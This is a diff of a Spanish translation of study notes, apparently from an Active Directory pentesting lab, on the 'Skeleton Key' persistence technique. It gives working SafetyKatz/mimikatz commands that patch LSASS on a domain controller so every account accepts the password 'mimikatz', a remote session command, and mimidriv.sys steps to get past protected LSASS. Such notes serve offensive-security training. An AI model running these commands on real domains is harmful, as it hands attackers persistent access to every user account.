@@ -3,22 +3,23 @@
 Tags: #AD #Windows #Powershell #SafetyKatz 
 
 ```bash 
-- Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
-- All the publicly known methods are NOT persistent across reboots.
-- Yet again, mimikatz to the rescue.
+- 'Skeleton Key' es una técnica de persistencia en la que es posible modificar (parchear) un Domain Controller (proceso 'lsass') para que permita autenticarse como cualquier usuario utilizando una única contraseña.
+- Todos los métodos públicamente conocidos 'NO son persistentes tras reinicios'.
+- Una vez más, 'mimikatz' al rescate.
 ```
 
 ```powershell 
-# Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
+! Usuario: Domain Admin
+
 ❯ SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+# Inyectar una Skeleton Key en el DC — parchea LSASS para que cualquier cuenta del dominio pueda autenticarse con la contraseña maestra "mimikatz" sin alterar las contraseñas reales.
 
-
-# Now, it is possible to access any machine with a valid username and password as "mimikatz"
 ❯ Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
+# Abrir una sesión remota de PowerShell en el DC usando las credenciales del Administrator — tras la Skeleton Key, cualquier usuario puede autenticarse con "mimikatz" como contraseña.
 ```
 
 ```bash 
-In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
+En caso de que 'lsass' esté ejecutándose como un proceso protegido, aún podemos usar 'Skeleton Key', pero se necesita el driver de 'mimikatz' (mimidriv.sys) en el disco del Domain Controller objetivo:
 
 	mimikatz # privilege::debug
 	mimikatz # !+
@@ -26,6 +27,6 @@ In case lsass is running as a protected process, we can still use Skeleton Key b
 	mimikatz # misc::skeleton
 	mimikatz # !-
 
-Notes:
-	1. Note that above would be very noisy in logs - Service installation (Kernel mode driver)
+Notas:
+	1. Tener en cuenta que lo anterior sería muy ruidoso en logs — instalación de un servicio (driver en modo kernel).
 ```
